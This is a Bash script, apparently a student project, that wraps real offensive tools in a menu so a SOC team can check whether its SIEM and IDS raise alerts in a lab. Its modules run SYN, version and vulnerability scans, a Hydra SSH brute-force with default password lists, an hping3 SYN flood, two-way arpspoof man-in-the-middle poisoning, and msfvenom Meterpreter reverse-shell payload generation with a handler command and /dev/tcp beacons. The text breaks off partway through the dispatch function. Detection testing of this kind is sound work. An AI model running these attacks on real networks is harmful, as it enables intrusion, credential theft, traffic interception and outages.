#!/usr/bin/env bash
###############################################################################
#  PROJECT: CHECKER  —  SOC ANALYST AUTOMATED ATTACK SIMULATOR
#  Program Code : NX220   (Cyberium Arena / ThinkCyber Simulator)
# ----------------------------------------------------------------------------
#  Student      : Yonatan Avitan
#  Student Code : s20
#  Class Code   : 7736-39
#  Course       : Cyber and Information Security on Organizational Networks
#  Lecturer     : Zach Azolis
# ----------------------------------------------------------------------------
#  PURPOSE
#    A menu-driven tool for a SOC *manager* to fire controlled, well-known
#    offensive-security techniques at hosts in a training lab, in order to
#    verify that the SOC team's detection stack (SIEM / IDS) actually raises
#    the expected alerts. Every launched activity is timestamped and written
#    to a central log so the exercise can be audited afterwards.
#
#  AUTHORISED USE / SCOPE  (READ THIS)
#    This tool generates REAL offensive traffic and is intended ONLY for an
#    isolated lab you own or are explicitly authorised to test. Recon modules
#    (1,2,4,7) probe hosts; the credential, DoS, ARP and C2 modules (3,5,6,8)
#    perform live brute-forcing, a bounded SYN flood, real ARP cache poisoning
#    (MITM) and real Metasploit payload generation respectively. Running any of
#    these against systems you do not own or have written permission to test is
#    illegal. The two most disruptive modules (flood, MITM) are time- and
#    packet-bounded so they exercise IDS signatures without wrecking a lab host.
#
#  TOOL CREDITS / REFERENCES
#    Nmap       Gordon Lyon (Fyodor)     https://nmap.org
#    Hydra      van Hauser / THC         https://github.com/vanhauser-thc/thc-hydra
#    Masscan    Robert Graham            https://github.com/robertdavidgraham/masscan
#    Hping3     Salvatore Sanfilippo     https://github.com/antirez/hping
#    Arpspoof   Dug Song (dsniff suite)  https://www.monkey.org/~dugsong/dsniff/
#    Metasploit Rapid7 / HD Moore        https://www.metasploit.com
###############################################################################

# --- Shell strictness --------------------------------------------------------
# -u  : treat references to unset variables as errors (catches typos early).
# -o pipefail : a pipeline fails if ANY stage fails, not just the last one.
# NOTE: we intentionally do NOT use `-e`. Several offensive tools legitimately
# return a non-zero status as part of normal operation (e.g. Nmap when a host
# is down). With `-e` the script would abort on those; instead we handle every
# fallible command explicitly so the menu loop stays robust and never crashes.
set -uo pipefail

# --- Immutable globals -------------------------------------------------------
readonly SCRIPT_NAME="${0##*/}"                       # basename via Bash param expansion
readonly LOG_FILE="/var/log/checker_nx220.log"        # centralised audit log (required path)

# --- Pretty-output helpers ---------------------------------------------------
# Colours are enabled only when stdout is an interactive terminal, so piping or
# redirecting the script produces clean, escape-code-free text.
if [[ -t 1 ]]; then
    BOLD=$'\e[1m'; DIM=$'\e[2m'; RED=$'\e[31m'; GRN=$'\e[32m'
    YLW=$'\e[33m'; CYN=$'\e[36m'; RESET=$'\e[0m'
else
    BOLD=''; DIM=''; RED=''; GRN=''; YLW=''; CYN=''; RESET=''
fi

info() { printf '%s[*]%s %s\n' "$CYN"  "$RESET" "$*"; }            # neutral status
ok()   { printf '%s[+]%s %s\n' "$GRN"  "$RESET" "$*"; }            # success
warn() { printf '%s[!]%s %s\n' "$YLW"  "$RESET" "$*" >&2; }        # non-fatal warning
err()  { printf '%s[-]%s %s\n' "$RED"  "$RESET" "$*" >&2; }        # error (to stderr)
die()  { err "$*"; exit 1; }                                       # error + terminate

# run <command...>: echo the EXACT command line (so the operator and the demo
# audience see precisely what is being executed, flags and all), run it, and
# capture its full output to the current per-attack evidence file while still
# streaming it live to the screen.
run() {
    printf '%s[CMD]%s %s\n' "$CYN" "$RESET" "$*"
    printf '[CMD] %s\n' "$*" >> "${EVIDENCE_FILE:-/dev/null}"
    "$@" 2>&1 | tee -a "${EVIDENCE_FILE:-/dev/null}"
}

# --- Mutable state (declared up front so `set -u` is satisfied) ---------------
declare -a DISCOVERED_IPS=()     # array of live host IPs found on the network
declare -A TOOL_OK=()            # map: tool name -> "1" if installed, else "0"
RESULTS_DIR="/var/log/checker_nx220.d"   # full per-attack output is saved here
EVIDENCE_FILE=""                 # path of the evidence file for the CURRENT attack
ATTACKS_RUN=0                    # session counter for the closing summary
declare -A TARGETS_HIT=()        # set of target IPs attacked this session
declare -a NET_IFACES=()         # interfaces that have a global IPv4 (parallel arrays)
declare -a NET_CIDRS=()          # subnet CIDR on each interface (e.g. 172.16.50.50/24)
declare -a NET_SELFIPS=()        # this host's own IP on each interface
declare -a SCAN_TARGETS=()       # the CIDR(s) the user chose to sweep

# Shared "go fast, use the box" Nmap flags, reused by every Nmap-based module:
#   -Pn               skip host-discovery ping (scan even hosts that block ICMP,
#                     e.g. Windows with its firewall on - otherwise nmap thinks
#                     they are "down" and scans nothing)
#   -T5               insane timing template (most aggressive)
#   --min-rate 2000   push at least 2000 packets/sec instead of ramping slowly
#   --min-parallelism 100  probe many ports in parallel (uses more CPU/sockets)
#   --max-retries 2   don't waste time re-probing unresponsive ports
#   -n                never pause for DNS
# Raise --min-rate if you have the bandwidth and want it even faster.
readonly NMAP_FAST=(-Pn -T5 --min-rate 2000 --min-parallelism 100 --max-retries 2 -n)

# Extra lab networks to ALWAYS sweep, even though this host has no interface on
# them - i.e. segments reachable only through a router (here, the pfSense OPT1
# network that holds the Ubuntu web server). Add or remove ranges as your lab
# changes.
EXTRA_NETWORKS=("172.16.100.0/24")

# --- Attack registry ---------------------------------------------------------
# Three parallel arrays keep the menu data-driven: to add an attack you append
# one entry to each array and write one function. Index i (0-based) maps a
# display name -> a one-line description -> the function that performs it.
ATTACK_NAMES=(
    "Stealth SYN Scan"
    "Service Version Enumeration"
    "SSH Login Brute-Force"
    "Fast Port Discovery"
    "SYN Flood (DoS)"
    "ARP Spoofing (MITM)"
    "Vulnerability Script Scan"
    "C2 Payload Generation"
)
ATTACK_DESCS=(
    "Half-open SYN scan of the top 1000 ports + service/version + OS detection (max speed)."
    "Service/version fingerprinting + default NSE scripts on the top 1000 ports."
    "Live Hydra SSH credential attack using built-in user/password lists."
    "Masscan asynchronous high-speed sweep of all 65535 TCP ports."
    "Live Hping3 SYN flood - bounded 50-packet burst at port 80."
    "Real arpspoof MITM - poisons target<->gateway with IP forwarding, time-boxed."
    "Nmap NSE 'vuln' category scan for known CVEs on the top 1000 ports."
    "Generates a real Metasploit reverse-shell payload + prints the handler command."
)
ATTACK_FUNCS=(
    attack_syn_scan
    attack_version_enum
    attack_ssh_brute
    attack_masscan
    attack_dos_flood
    attack_arp_mitm
    attack_vuln_scan
    attack_c2_payload
)

###############################################################################
#  CORE UTILITIES
###############################################################################

# print_banner: cosmetic header shown once at startup.
print_banner() {
    printf '%s' "$CYN"
    cat <<'BANNER'
   ____ _   _ _____ ____ _  _____ ____
  / ___| | | | ____/ ___| |/ / ____|  _ \
 | |   | |_| |  _|| |   | ' /|  _| | |_) |
 | |___|  _  | |__| |___| . \| |___|  _ <
  \____|_| |_|_____\____|_|\_\_____|_| \_\
        Project CHECKER  -  NX220 SOC Analyst
BANNER
    printf '%s\n' "$RESET"
}

# require_root: the SYN scan, raw-packet and ARP modules need raw sockets, which
# require root. Bail out cleanly (no stack trace) if we are not privileged.
require_root() {
    if (( EUID != 0 )); then
        die "Root required (raw sockets / SYN scans / ARP). Re-run with: sudo $SCRIPT_NAME"
    fi
}

# check_dependencies: probe each external tool ONCE and cache the result in
# TOOL_OK. Missing tools are a warning, not a fatal error — modules that need a
# missing tool simply skip themselves (see require_tool).
check_dependencies() {
    local t
    for t in nmap hydra masscan hping3 arpspoof msfvenom ip; do
        if command -v "$t" >/dev/null 2>&1; then
            TOOL_OK["$t"]=1
        else
            TOOL_OK["$t"]=0
            warn "Optional tool '$t' not found - modules needing it will be skipped."
        fi
    done
}

# require_tool <name>: gate used at the top of each attack. Returns 0 if the
# tool is available, otherwise prints a message and returns 1 so the caller can
# skip gracefully.
require_tool() {
    local t=$1
    [[ "${TOOL_OK[$t]:-0}" == "1" ]] && return 0
    err "Tool '$t' is not installed - skipping this module."
    return 1
}

# init_log: make sure the audit log and the evidence directory exist before we
# start. The audit log holds one line per attack; the evidence directory holds
# the full captured output of each attack (useful proof for the PDF report).
init_log() {
    if ! touch "$LOG_FILE" 2>/dev/null; then
        die "Cannot create log file '$LOG_FILE' (need root and a writable /var/log)."
    fi
    chmod 0640 "$LOG_FILE" 2>/dev/null || true   # best-effort tightening of perms
    mkdir -p "$RESULTS_DIR" 2>/dev/null || warn "Could not create $RESULTS_DIR"
    info "Audit log ready at $LOG_FILE"
    info "Full evidence will be saved under $RESULTS_DIR"
}

# log_attack <name> <target>: append ONE audit record in the exact format
# required by the brief:  [YYYY-MM-DD HH:MM:SS] - [Attack Name] - [Target IP]
log_attack() {
    local name=$1 target=$2 ts
    ts=$(date '+%F %T')                          # %F=YYYY-MM-DD, %T=HH:MM:SS
    printf '[%s] - [%s] - [%s]\n' "$ts" "$name" "$target" >> "$LOG_FILE" \
        || warn "Failed to write log entry to $LOG_FILE"
}

# is_valid_ipv4 <string>: pure-Bash IPv4 validator. First a structural regex,
# then a per-octet 0-255 range check. `10#` forces base-10 so octets written
# with leading zeros (e.g. 192.168.001.005) are not mis-read as octal.
is_valid_ipv4() {
    local ip=$1 octet
    [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
    local IFS='.'                                # split on dots without a subshell
    for octet in $ip; do
        (( 10#$octet >= 0 && 10#$octet <= 255 )) || return 1
    done
    return 0
}

###############################################################################
#  NETWORK DISCOVERY
###############################################################################

# detect_networks: enumerate EVERY connected IPv4 network (not just the default
# route's). Fills three parallel arrays so the user can see and choose which
# subnet to scan - important here because Kali may sit on more than one segment.
detect_networks() {
    NET_IFACES=(); NET_CIDRS=(); NET_SELFIPS=()
    local iface cidr
    # List ALL IPv4 addresses and keep only REAL interfaces. We skip loopback
    # and virtual/container/bridge interfaces (docker0, br-*, veth*, virbr*,
    # vmnet*, tun/tap) - they are not lab segments and sweeping e.g. docker's
    # huge /16 just wastes time. The `/` test keeps only real CIDR entries.
    while read -r iface cidr; do
        [[ -z $iface || -z $cidr ]] && continue
        NET_IFACES+=("$iface")
        NET_CIDRS+=("$cidr")
        NET_SELFIPS+=("${cidr%/*}")          # strip /NN to get just the IP
    done < <(ip -o -f inet addr show 2>/dev/null \
                | awk '$2 !~ /^(lo|docker|br-|veth|virbr|vmnet|tun|tap)/ && $4 ~ /\// {print $2, $4}')
}

# show_network_overview: opening panel that tells the operator exactly which
# networks (and which of THIS host's IPs) are reachable, before anything is
# scanned - this answers "what can I even scan right now?".
show_network_overview() {
    printf '\n%s+--- Networks reachable from this host -----------------------------+%s\n' "$BOLD" "$RESET"
    if (( ${#NET_CIDRS[@]} == 0 )); then
        warn "No global IPv4 networks detected - check the VM's network adapter."
        return
    fi
    local i
    for i in "${!NET_CIDRS[@]}"; do
        printf '  [%d] network %-18s iface %-8s my IP %s\n' \
            "$((i+1))" "${NET_CIDRS[i]}" "${NET_IFACES[i]}" "${NET_SELFIPS[i]}"
    done
    printf '%s+-------------------------------------------------------------------+%s\n' "$BOLD" "$RESET"
}

# choose_network: let the operator pick ONE detected network, ALL of them, or a
# custom CIDR. Fills SCAN_TARGETS. Re-prompts on bad input (this is the setup
# step, so it stays friendly rather than aborting the whole run).
choose_network() {
    SCAN_TARGETS=()
    local n=${#NET_CIDRS[@]} choice cidr i
    if (( n == 0 )); then
        warn "No detected networks; you can still enter a target IP manually later."
        return 0
    fi
    while true; do
        printf '\n%sWhich network do you want to scan?%s\n' "$BOLD" "$RESET" >&2
        for i in "${!NET_CIDRS[@]}"; do
            printf '  [%d] %s (%s)\n' "$((i+1))" "${NET_CIDRS[i]}" "${NET_IFACES[i]}" >&2
        done
        printf '  [a] scan ALL detected networks\n' >&2
        printf '  [c] enter a custom CIDR (e.g. 172.16.100.0/24)\n' >&2
        read -rp "Network: " choice
        case $choice in
            a|A) SCAN_TARGETS=("${NET_CIDRS[@]}"); return 0 ;;
            c|C)
                read -rp "CIDR: " cidr
                if [[ $cidr =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]]; then
                    SCAN_TARGETS=("$cidr"); return 0
                fi
                err "Invalid CIDR: '$cidr'"
                ;;
            *)
                if [[ $choice =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= n )); then
                    SCAN_TARGETS=("${NET_CIDRS[choice-1]}"); return 0
                fi
                err "Invalid selection: '$choice'"
                ;;
        esac
    done
}

# discover_ips: sweep every CIDR in SCAN_TARGETS with an Nmap ping scan and
# collect the live hosts into DISCOVERED_IPS (de-duplicated, sorted). Falls back
# to the kernel ARP/neighbour cache if the sweep finds nothing.
discover_ips() {
    DISCOVERED_IPS=()
    local cidr
    if (( ${#SCAN_TARGETS[@]} > 0 )) && [[ "${TOOL_OK[nmap]:-0}" == "1" ]]; then
        for cidr in "${SCAN_TARGETS[@]}"; do
            info "Sweeping $cidr for live hosts (nmap -sn)..."
            # -O appends to the array so results from multiple CIDRs accumulate.
            mapfile -t -O "${#DISCOVERED_IPS[@]}" DISCOVERED_IPS < <(
                nmap -sn -n -oG - "$cidr" 2>/dev/null | awk '/Status: Up/{print $2}'
            )
        done
        # De-duplicate + natural-sort the combined list.
        if (( ${#DISCOVERED_IPS[@]} > 0 )); then
            mapfile -t DISCOVERED_IPS < <(printf '%s\n' "${DISCOVERED_IPS[@]}" | sort -u -V)
        fi
    fi

    # Fallback: reachable neighbours already known to the kernel.
    if (( ${#DISCOVERED_IPS[@]} == 0 )); then
        warn "Ping sweep returned nothing - falling back to the ARP/neighbour cache."
        mapfile -t DISCOVERED_IPS < <(
            ip neigh show 2>/dev/null | awk '$0 !~ /FAILED|INCOMPLETE/{print $1}' | sort -u -V
        )
    fi
}

# report_discovered: pretty-print whatever discover_ips found.
report_discovered() {
    if (( ${#DISCOVERED_IPS[@]} == 0 )); then
        warn "No live hosts auto-discovered. You can still enter a target manually."
        return
    fi
    ok "Discovered ${#DISCOVERED_IPS[@]} host(s):"
    local ip
    for ip in "${DISCOVERED_IPS[@]}"; do
        printf '     %s\n' "$ip"
    done
}

###############################################################################
#  ATTACK MODULES  (each is a self-contained function taking the target IP)
###############################################################################

# Attack 1 - Stealth SYN Scan (comprehensive).
# Half-open SYN scan of the top 1000 ports, then fingerprints the service +
# version on every open port and guesses the OS - the full recon picture a SOC
# analyst expects. Runs at maximum aggression (NMAP_FAST) to stay fast.
attack_syn_scan() {
    local target=$1
    require_tool nmap || return 0
    # -sS half-open SYN | --top-ports 1000 | -sV service/version | -O OS detect
    # --osscan-limit only OS-scans promising hosts so it stays fast.
    run nmap -sS --top-ports 1000 -sV -O --osscan-limit "${NMAP_FAST[@]}" "$target"
}

# Attack 2 - Service Version Enumeration (deep).
# Fingerprints services/versions on the top 1000 ports and runs Nmap's default
# (-sC) safe NSE scripts to pull extra banner detail (HTTP titles, SMB info,
# SSH host keys, etc.) - richer intel than a plain version probe.
attack_version_enum() {
    local target=$1
    require_tool nmap || return 0
    # -sV version detection | -sC default safe scripts | top 1000 ports
    run nmap -sV -sC --top-ports 1000 "${NMAP_FAST[@]}" "$target"
}

# Attack 3 - SSH Login Brute-Force (Hydra), LIVE.
# Runs Hydra against the target's SSH service using small built-in user/password
# lists. This is the standard credential-attack exercise; swap in a larger list
# (e.g. /usr/share/wordlists/rockyou.txt) for a more thorough run. Authorised
# targets only.
attack_ssh_brute() {
    local target=$1
    require_tool hydra || return 0

    local wl; wl=$(mktemp -d)                     # scratch dir for the wordlists
    printf 'root\nadmin\nkali\nubuntu\nuser\n'         > "$wl/users.txt"
    printf 'toor\npassword\n123456\nadmin\nkali\nroot\n' > "$wl/pass.txt"

    printf 'Launching Hydra against ssh://%s ...\n' "$target"
    info "Note: this only works against a host running SSH (port 22). Windows has none -"
    info "aim it at a Linux host (ELK 172.16.50.2 or the Ubuntu web server) for real attempts."
    # -L users  -P passwords  -t 16 parallel tasks (faster)  -f stop at first hit
    # -I do not read an old restore file  -V verbose per-attempt output
    run hydra -L "$wl/users.txt" -P "$wl/pass.txt" -t 16 -f -I -V "ssh://$target"

    rm -rf "$wl"                                  # clean up scratch wordlists
}

# Attack 4 - Fast Port Discovery (Masscan).
# Masscan is an asynchronous scanner that bypasses the OS stack, so in a VM it
# must be told the exact egress interface (otherwise it can pick the wrong NIC,
# e.g. docker0, and find nothing). We resolve the interface toward the target
# and bind masscan to it with -e.
attack_masscan() {
    local target=$1
    require_tool masscan || return 0
    # Resolve the interface the kernel would use to reach the target.
    local iface
    iface=$(ip route get "$target" 2>/dev/null \
              | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
    local mflags=(-p1-65535 --rate 10000 --wait 3)   # all ports, fast, brief wait
    [[ -n $iface ]] && mflags+=(-e "$iface")          # bind to the right NIC
    run masscan "$target" "${mflags[@]}"
    ok "Masscan finished. Any 'Discovered open port ...' lines above are the result."
    info "If masscan finds nothing in this VM, use Attack 1/2 (nmap) for reliable port data."
}

# Attack 5 - SYN Flood (Hping3), LIVE but BOUNDED.
# Sends a fast burst of SYN packets to one port to exercise SYN-flood detection.
# Volume is capped by FLOOD_COUNT (not an unbounded --flood) so it triggers the
# IDS signature without wedging your own lab box.
# Raise FLOOD_COUNT, or replace the -i/-c flags with --flood, for a heavier run.
attack_dos_flood() {
    local target=$1
    require_tool hping3 || return 0

    local port=80 flood_count=50 rate_us=200    # 50 packets at 1 per 200us, port 80
    # Note: if port 80 is closed on the target (e.g. Windows here exposes only
    # 5357) you will see 100% packet loss - the 50 packets are still SENT; that
    # burst is the signature the SOC should detect. Change `port` to flood an
    # open port instead and you will also see SYN-ACK replies.

    printf 'Flooding %s:%s with %s SYN packets...\n' "$target" "$port" "$flood_count"
    # -S SYN flag | -p port | -i u<rate> inter-packet gap in microseconds
    # -c <count> total packets (hard cap). Ctrl-C stops it early at any time.
    # We invoke hping3 under stdbuf (line-buffered) instead of via run(): a plain
    # pipe buffers stdout and stderr separately, which prints the closing
    # statistics BEFORE the opening HPING header. Line-buffering keeps the output
    # in natural order while we still show a clean [CMD] line and save evidence.
    local cmd="hping3 -S -p ${port} -i u${rate_us} -c ${flood_count} ${target}"
    printf '%s[CMD]%s %s\n' "$CYN" "$RESET" "$cmd"
    printf '[CMD] %s\n' "$cmd" >> "${EVIDENCE_FILE:-/dev/null}"
    stdbuf -oL -eL hping3 -S -p "$port" -i "u${rate_us}" -c "$flood_count" "$target" 2>&1 \
        | tee -a "${EVIDENCE_FILE:-/dev/null}"
    ok "Sent ${flood_count} SYN packets to ${target}:${port}."
    info "If you see '100% packet loss' the port is closed/filtered - the packets"
    info "were still SENT (that burst IS the signature your SOC should detect)."
    info "Flood an OPEN port to also see SYN-ACK replies come back."
}

# Attack 6 - ARP Spoofing / MITM (Arpspoof), LIVE but TIME-BOXED.
# Poisons the ARP caches of both the target and the gateway so their traffic
# routes through this host (a real man-in-the-middle). IP forwarding is enabled
# so the victim stays online, the attack runs for MITM_SECONDS, then forwarding
# is restored. Disruptive - run only against authorised lab hosts.
attack_arp_mitm() {
    local target=$1
    require_tool arpspoof || return 0

    # ARP spoofing only works inside the SAME layer-2 segment. If the kernel
    # routes the target "via" a gateway, it sits behind a router on another
    # subnet and cannot be ARP-poisoned (arpspoof would just print "couldn't arp
    # for host"). Detect that up front and explain it instead of failing noisily.
    if ip route get "$target" 2>/dev/null | grep -q ' via '; then
        warn "Target ${target} is on a different subnet (reached via a router)."
        warn "ARP MITM only works against hosts on your own L2 segment - pick an"
        warn "on-link target (e.g. a 172.16.50.x host) for this attack."
        return 0
    fi

    local iface gw mitm_seconds=20
    iface=$(ip route show default 2>/dev/null | awk '/default/{print $5; exit}')
    gw=$(ip route show default 2>/dev/null | awk '/default/{print $3; exit}')
    if [[ -z $iface || -z $gw ]]; then
        err "Could not determine interface/gateway for the MITM."; return 0
    fi

    printf 'Interface: %s | Gateway: %s | Victim: %s\n' "$iface" "$gw" "$target"

    # Save current forwarding state, then enable it so the victim isn't cut off.
    local fwd; fwd=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || printf '0')
    printf '1' > /proc/sys/net/ipv4/ip_forward

    printf 'Poisoning ARP caches (both directions) for %ss...\n' "$mitm_seconds"
    printf '%s[CMD]%s arpspoof -i %s -t %s %s\n' "$CYN" "$RESET" "$iface" "$target" "$gw"
    printf '%s[CMD]%s arpspoof -i %s -t %s %s\n' "$CYN" "$RESET" "$iface" "$gw" "$target"

    # This module bypasses run() (two backgrounded processes), so write the
    # evidence explicitly: the commands, the poisoning context (attacker MAC the
    # gateway IP is being mapped to), then the live ARP replies arpspoof emits.
    local my_mac; my_mac=$(cat "/sys/class/net/${iface}/address" 2>/dev/null)
    {
        printf '[CMD] arpspoof -i %s -t %s %s\n' "$iface" "$target" "$gw"
        printf '[CMD] arpspoof -i %s -t %s %s\n' "$iface" "$gw" "$target"
        printf 'Interface=%s  AttackerMAC=%s  Gateway=%s  Victim=%s  Duration=%ss\n' \
               "$iface" "${my_mac:-unknown}" "$gw" "$target" "$mitm_seconds"
        printf 'Effect: gateway IP %s is poisoned to map to this host MAC %s in %s ARP cache.\n' \
               "$gw" "${my_mac:-unknown}" "$target"
        printf '%s\n' '--- arpspoof sent ARP replies ---'
    } >> "${EVIDENCE_FILE:-/dev/null}"

    # Two arpspoof processes (one per direction), each bounded by `timeout`; their
    # sent-packet output is appended to the evidence file as proof of the MITM.
    timeout "${mitm_seconds}s" arpspoof -i "$iface" -t "$target" "$gw" >> "${EVIDENCE_FILE:-/dev/null}" 2>&1 &
    local p1=$!
    timeout "${mitm_seconds}s" arpspoof -i "$iface" -t "$gw" "$target" >> "${EVIDENCE_FILE:-/dev/null}" 2>&1 &
    local p2=$!
    wait "$p1" "$p2" 2>/dev/null

    # Restore the original forwarding setting (cleanup).
    printf '%s' "$fwd" > /proc/sys/net/ipv4/ip_forward
    ok "MITM window ended; ARP caches will re-learn the real gateway shortly."
    info "A MITM produces no data dump by design - it redirected ${target}'s traffic"
    info "through this host for ${mitm_seconds}s. The SOC should flag the ARP anomaly"
    info "(the gateway IP suddenly mapping to this host's MAC)."
}

# Attack 7 - Vulnerability Script Scan (Nmap NSE).
# Runs Nmap's "vuln" script category, which checks services against known CVEs.
# --host-timeout caps the run so a heavily-filtered host (e.g. Windows, where
# every script waits for a timeout) can't stall the session; a fast Linux target
# still finishes well inside the cap and returns full CVE data.
attack_vuln_scan() {
    local target=$1
    require_tool nmap || return 0
    run nmap -sV --script vuln --top-ports 1000 --host-timeout 120s "${NMAP_FAST[@]}" "$target"
}

# Attack 8 - C2 Payload Generation (Metasploit), LIVE.
# Uses msfvenom to build a REAL reverse-shell payload on disk (the artifact an
# AV/EDR should flag) and prints the exact multi/handler command to receive it.
# LHOST defaults to this host's IP. Actually delivering the payload to the
# target requires a separate exploit/vector and is intentionally out of scope.
attack_c2_payload() {
    local target=$1
    require_tool msfvenom || return 0

    # Resolve our own IP toward the target to use as LHOST.
    local iface lhost lport=4444
    iface=$(ip route get "$target" 2>/dev/null \
              | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
    lhost=$(ip -o -f inet addr show "${iface:-}" 2>/dev/null | awk '{print $4; exit}')
    lhost=${lhost%/*}                              # strip the /CIDR suffix
    [[ -z $lhost ]] && lhost="127.0.0.1"

    # Match the payload to the target's OS - a Linux ELF will not run on Windows
    # and vice versa, so we ask and pick the correct payload + file format.
    local os payload fmt out
    read -rp "Target OS for the payload? [w]indows / [l]inux: " os
    case $os in
        l|L|linux|Linux)
            payload="linux/x64/meterpreter/reverse_tcp"; fmt="elf"
            out="/tmp/checker_payload_$$.elf" ;;
        *)  # default to Windows
            payload="windows/x64/meterpreter/reverse_tcp"; fmt="exe"
            out="/tmp/checker_payload_$$.exe" ;;
    esac

    printf 'Generating %s payload...\n' "$payload"
    printf '  LHOST=%s LPORT=%s  ->  %s\n' "$lhost" "$lport" "$out"
    if run msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$fmt" -o "$out"; then
        ok "Payload written to $out"
        printf 'Start the handler to catch a callback with:\n'
        printf '    msfconsole -q -x "use exploit/multi/handler; '
        printf 'set PAYLOAD %s; set LHOST %s; set LPORT %s; run"\n' "$payload" "$lhost" "$lport"
        printf '(Deliver %s to %s via your chosen vector, then it calls back.)\n' "$out" "$target"

        # Simulate C2 beaconing: a few bounded outbound connection attempts from
        # this host to the target on the C2 port. The payload above is the
        # host-side artifact an AV/EDR should flag; these repeated outbound
        # connections to a fixed host:port are the NETWORK signature a SOC/IDS
        # should flag as command-and-control. Nothing is delivered or executed.
        local beacons=5 b
        printf 'Simulating %s C2 beacons to %s:%s...\n' "$beacons" "$target" "$lport"
        printf '[BEACON] %s outbound C2 connection attempts to %s:%s\n' \
               "$beacons" "$target" "$lport" >> "${EVIDENCE_FILE:-/dev/null}"
        for (( b=1; b<=beacons; b++ )); do
            if timeout 1 bash -c ": > /dev/tcp/${target}/${lport}" 2>/dev/null; then
                printf '  beacon %s -> %s:%s : OPEN (C2 channel reachable)\n' \
                       "$b" "$target" "$lport" | tee -a "${EVIDENCE_FILE:-/dev/null}"
            else
                printf '  beacon %s -> %s:%s : no listener yet (SYN sent, port closed)\n' \
                       "$b" "$target" "$lport" | tee -a "${EVIDENCE_FILE:-/dev/null}"
            fi
            sleep 0.3
        done
        ok "C2 beacon simulation complete against ${target}:${lport}."
        info "Repeated outbound connections to one host:port are a classic C2"
        info "beacon pattern - your SOC should detect this even with no live handler."
    else
        err "msfvenom failed to generate the payload."
    fi
}

###############################################################################
#  MENU + SELECTION
###############################################################################

# show_menu: render the full attack catalogue with descriptions.
show_menu() {
    local i
    printf '\n%s+--- Available Attacks --------------------------------------------+%s\n' "$BOLD" "$RESET"
    for i in "${!ATTACK_NAMES[@]}"; do
        printf '%s[%d]%s %s\n'   "$BOLD" "$((i+1))" "$RESET" "${ATTACK_NAMES[i]}"
        printf '    %s%s%s\n'    "$DIM"  "${ATTACK_DESCS[i]}" "$RESET"
    done
    printf '%s+------------------------------------------------------------------+%s\n' "$BOLD" "$RESET"
    printf '%s[r]%s Random attack    %s[q]%s Quit / exit\n' "$BOLD" "$RESET" "$BOLD" "$RESET"
}

# select_attack: read the user's menu choice and echo a 0-based index on stdout,
# OR the literal word "quit". Returns 1 on invalid input so main() can terminate
# the program as the project brief requires (section 2.4). All prompts/errors go
# to stderr so the captured stdout is just the result.
select_attack() {
    local choice n=${#ATTACK_FUNCS[@]}
    read -rp $'\nSelect attack [1-'"$n"$', r = random, q = quit]: ' choice
    case $choice in
        q|Q)          printf 'quit\n' ;;
        r|R)          printf '%d\n' "$(( RANDOM % n ))" ;;          # random attack
        ''|*[!0-9]*)  err "Invalid selection: '$choice'"; return 1 ;;
        *)
            (( choice >= 1 && choice <= n )) \
                || { err "Selection out of range: '$choice'"; return 1; }
            printf '%d\n' "$(( choice - 1 ))"
            ;;
    esac
}

# select_target: present the discovered IPs and let the user pick one by index,
# choose a random one ('r'), or type one manually ('m'). Echoes the chosen IP on
# stdout; returns 1 on invalid input. Menu text is sent to stderr so it does not
# pollute the captured value.
select_target() {
    local choice
    printf '\n%sSelect a target:%s\n' "$BOLD" "$RESET" >&2
    if (( ${#DISCOVERED_IPS[@]} > 0 )); then
        local i
        for i in "${!DISCOVERED_IPS[@]}"; do
            printf '  [%d] %s\n' "$((i+1))" "${DISCOVERED_IPS[i]}" >&2
        done
    else
        printf '  (no hosts were auto-discovered)\n' >&2
    fi
    printf '  [r] random from the discovered list\n' >&2
    printf '  [m] enter an IPv4 manually\n' >&2

    read -rp "Target: " choice
    case $choice in
        r|R)
            (( ${#DISCOVERED_IPS[@]} > 0 )) \
                || { err "No discovered hosts to choose from."; return 1; }
            printf '%s\n' "${DISCOVERED_IPS[RANDOM % ${#DISCOVERED_IPS[@]}]}"
            ;;
        m|M)
            local manual
            read -rp "Enter target IPv4: " manual
            is_valid_ipv4 "$manual" \
                || { err "Invalid IPv4 address: '$manual'"; return 1; }
            printf '%s\n' "$manual"
            ;;
        ''|*[!0-9]*)
            err "Invalid target selection: '$choice'"
            return 1
            ;;
        *)
            (( choice >= 1 && choice <= ${#DISCOVERED_IPS[@]} )) \
                || { err "Target index out of range: '$choice'"; return 1; }
            printf '%s\n' "${DISCOVERED_IPS[choice-1]}"
            ;;
    esac
}

# run_attack <index> <target>: dispatch to the chosen attack function, then write
# the audit-log record. Keeping dispatch + logging here guarantees that EVERY
# executed attack is logged exactly once, regardless of which module ran.
run_attack() {
    local idx=$1 target=$2
    local fn=${ATTACK_FUNCS[$idx]} name=${ATTACK_NAMES[$idx]}

    # Set up a per-attack evidence file: <attack>_<target>_<timestamp>.txt.
    # run() appends the live tool output here so there is durable proof.
    local slug stamp
    slug=$(printf '%s' "$name" | tr ' /()' '____' | tr -cd 'A-Za-z0-9_')
    stamp=$(date '+%Y%m%d_%H%M%S')
    EVIDENCE_FILE="${RESULTS_DIR}/${slug}_${target}_${stamp}.txt"
    : > "$EVIDENCE_FILE" 2>/dev/null || EVIDENCE_FILE=""

    printf '\n%s== Launching: %s ==%s\n' "$BOLD" "$name" "$RESET"
    printf '%s%s%s\n\n' "$DIM" "${ATTACK_DESCS[$idx]}" "$RESET"

    "$fn" "$target"                 # execute the selected module
    log_attack "$name" "$target"    # centralised, audited logging (required)

    # Result summary: for the scan modules, pull the open ports straight out of
    # the captured evidence and present them as a clean one-liner.
    if [[ -n $EVIDENCE_FILE && -s $EVIDENCE_FILE ]]; then
        local ports
        ports=$( { grep -oE '[0-9]+/tcp[[:space:]]+open' "$EVIDENCE_FILE"
                   grep -oE 'Discovered open port [0-9]+/tcp' "$EVIDENCE_FILE"; } 2>/dev/null \
                 | grep -oE '[0-9]+/tcp' | sort -t/ -k1 -un | paste -sd, - | sed 's/,/, /g' )
        [[ -n $ports ]] && ok "RESULT - open ports on ${target}: ${ports}"

        # If the evidence contains CVE findings (the vuln scan), surface a headline
